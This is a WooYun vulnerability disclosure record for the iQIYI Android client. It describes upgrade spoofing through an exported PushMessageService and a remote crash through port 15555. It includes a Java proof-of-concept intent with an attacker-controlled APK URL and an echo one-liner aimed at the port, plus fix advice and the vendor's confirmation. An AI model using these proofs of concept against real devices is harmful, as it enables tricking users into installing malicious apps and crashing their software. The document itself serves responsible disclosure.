{"id": 38229, "wybug_id": "wooyun-2015-096831", "wybug_title": "爱奇艺视频android客户端升级欺骗与远程拒绝服务", "wybug_corp": "奇艺", "wybug_author": "小荷才露尖尖角", "wybug_date": "2015-02-11 18:59", "wybug_open_date": "2015-05-12 20:04", "wybug_type": "权限提升", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程拒绝服务", "客户端升级欺骗"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向公众公开  简要描述： 漏洞1：本地恶意程序利用某暴露服务进行欺骗升级漏洞2：远程拒绝服务 详细说明：  测试版本：爱奇艺视频android客户端，6.0下载地址：http://store.iqiyi.com/（1）本地恶意程序利用某暴露服务进行欺骗升级org.qiyi.android.commonphonepad.pushmessage.PushMessageService暴露 ，本地恶意程序可以通过该服务启动客户端升级过程，并控制升级url，可欺骗用户安装任意apk。见PushMessageService中的代码片段，服务启动后的OnStart方法会调用a方法，该方法会判断传入Intent的action，获得其extra，并最终调用new bs(((Context)this)).a(v5)方法，启动新版本apk的下载和更新。当action为com.qiyi.video.action.updateApp.retry或者com.qiyi.video.action.download.newApp时都会启动更新过程，且extra中的appUrl可控。当intent action为com.qiyi.video.action.updateApp.retry时的处理过程\n\n当intent action为com.qiyi.video.action.download.newApp时的处理过程\n\nPOC：\nm_spoofAction = (Button)findViewById(R.id.spoof);        m_spoofUrl = (EditText)findViewById(R.id.apkurl);        m_spoofAction.setOnClickListener(new OnClickListener()        {        \t@Override\t\t\tpublic void onClick(View v) {\t\t\t\t// TODO Auto-generated method stub        \t\tString strUrl =(m_spoofUrl.getText()).toString();            \tif (strUrl != null) {            \t\tIntent i = new Intent();            \t\ti.setAction(\"com.qiyi.video.action.updateApp.retry\");            \t\ti.setComponent(new ComponentName(\"com.qiyi.video\",             \t\t\t\t\"org.qiyi.android.commonphonepad.pushmessage.PushMessageService\"));            \t\ti.putExtra(\"downLoadingStr\", \"iqiyi\");            \t\ti.putExtra(\"appUrl\", strUrl);            \t\ti.putExtra(\"Update_Retry_type\", 6);            \t\tstartService(i);            \t}\t}        });\n（2）远程拒绝服务爱奇艺客户端启动后会运行 MultiDeviceCoWorkService，该服务会打开15555端口监听，如下图。OnStart方法，调用a.a方法\n\na.a方法启动SocketSer服务，端口为传入的15555\n\n测试时发现，远程向该端口提供任意字符，爱奇艺客户端将闪退。猜测该端口用于多个iqiyi设备的协作，由于手上没有多个iqiyi设备，也就没进行深入分析。POC：\necho -n “xxx”  |  192.168.2.3 15555\n上述192.168.2.3为爱奇艺客户端运行手机的IP地址。   漏洞证明：  (1)漏洞1的证明：构建Web服务器，放置fake.qiyi.apk\n\n欺骗爱奇艺视频客户端进行升级\n\n提示并下载新版本\n\n下载完成，用户点击后安装\n\n(2)漏洞2的证明logcat记录的异常信息\n02-11 17:05:31.772: A/ActivityManager(932): Service ServiceRecord{43134780 u0 com.qiyi.video/com.iqiyi.video.download.service.RemoteDownloadService} in process ProcessRecord{42cf5b60 13745:com.qiyi.video/u0a115} not same as in map: null\n   修复方案：  （1）对PushMessageService设为exported:false，或者禁止第三方应用传入appUrl。（2）对15555端口的使用仔细检查。   版权声明：转载请注明来源 小荷才露尖尖角@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-11 20:03 厂商回复： 谢谢您的提交，我们会尽快处理。希望您继续关注爱奇艺PPS。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-06 16:12 |    \t\txFrank \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专注Android系统安全)\t\t \n  远程拒绝服务，是批量的么？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}